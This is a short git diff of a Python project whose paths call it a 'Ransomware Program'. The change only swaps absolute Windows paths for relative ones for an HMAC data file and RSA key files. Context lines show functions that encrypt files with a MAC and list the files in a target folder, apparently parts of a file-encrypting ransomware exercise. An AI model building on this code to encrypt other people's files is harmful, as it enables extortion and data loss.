@@ -154,7 +154,7 @@ def MyfileEncryptMAC(filepath):
     }
 
     # Store encoded JSON data to JSON file
-    with open('C://Python Projects//Ransomware Program//hmac//HMACdata.json', 'w') as f:
+    with open('hmac//HMACdata.json', 'w') as f:
         json.dump(data, f)
 
     return c, iv, encKey, HMACKey, tag, ext
@@ -395,8 +395,8 @@ def main():
     mypath = confirmPath.replace("/", "\\")
 
     # Initialize Filepaths for target file, public key, and private key
-    RSA_PublicKey_filepath = 'C://Python Projects//Ransomware Program//keys//rsa_public_key.pem'
-    RSA_PrivateKey_filepath = 'C://Python Projects//Ransomware Program//keys//rsa_private_key.pem'
+    RSA_PublicKey_filepath = 'keys//rsa_public_key.pem'
+    RSA_PrivateKey_filepath = 'keys//rsa_private_key.pem'
 
     # Compile a list of filenames in the folder
     listOfFileNames = [f for f in listdir(mypath) if isfile(join(mypath, f))]
